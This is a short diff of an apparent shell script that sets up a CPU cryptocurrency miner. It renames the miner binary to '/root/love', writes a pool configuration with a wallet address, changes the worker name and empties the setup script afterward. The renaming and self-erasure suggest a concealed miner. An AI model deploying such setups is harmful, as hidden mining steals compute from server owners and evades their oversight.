@@ -29,7 +29,7 @@ mv /root/cpuminer-opt-linux/cpuminer-sse2 /root/love
 cat >>/root/config.json <<EOF
 {
   "url": "stratum+tcps://$fastest_server:17079",
-  "user": "v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.VultrLimit2"
+  "user": "v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.VultrLimit3"
 }
 EOF
 cat /dev/null > /root/danielluis1921.sh
